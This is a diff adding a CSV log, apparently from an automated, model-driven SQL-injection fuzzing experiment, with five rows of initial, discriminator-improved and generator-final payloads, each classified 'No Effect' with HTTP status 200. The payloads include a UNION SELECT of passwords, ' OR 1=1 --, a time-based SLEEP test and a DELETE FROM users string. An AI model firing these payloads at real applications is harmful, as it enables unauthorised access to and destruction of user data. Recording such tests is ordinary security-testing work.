@@ -1,0 +1,16 @@
+iteration,initial_payload,classification,reasoning,discriminator_improved_payload,generator_final_payload,test_result
+1,1. SELECT * FROM users WHERE username='admin' AND password='',No Effect,The payload does not have any malicious code that could lead to SQL injection.,SELECT * FROM users WHERE username='admin' AND password='' --,"```vbnet
+SELECT * FROM users WHERE username='admin' AND password='1a'
+```",200
+1,"2. INSERT INTO users (username, password) VALUES ('admin', '123456')",No Effect,The given SQL injection payload does not have any injective syntax that can exploit the application.,' OR '1'='1 UNION SELECT password FROM users WHERE username='admin',"```vbnet
+' OR 1=1 --'
+```",200
+1,3. UPDATE users SET password = '' WHERE username = 'admin',No Effect,The SQL injection payload does not affect the response or behavior of the application.,' OR SLEEP(5) --,"```vbnet
+' OR 1=1 AND SLEEP(5)
+```",200
+1,4. DELETE FROM users WHERE username = 'admin',No Effect,"The given SQL injection payload did not affect the server response, as the HTTP status was 200 and the response time is normal.",' DELETE FROM users WHERE username = 'admin' --,"```vbnet
+' DELETE FROM users WHERE username = 'admin' --
+```",200
+1,5. SELECT * FROM users WHERE username = 'admin' AND password IS NULL,No Effect,"The given SQL injection payload does not appear to have any effect on the response, as the HTTP status returned was 200 and the response time was normal.",5. SELECT * FROM users WHERE username = 'admin' AND password IS NULL --,"```vbnet
+5. SELECT * FROM users WHERE username = 'admin' AND password IS NULL --
+```",200
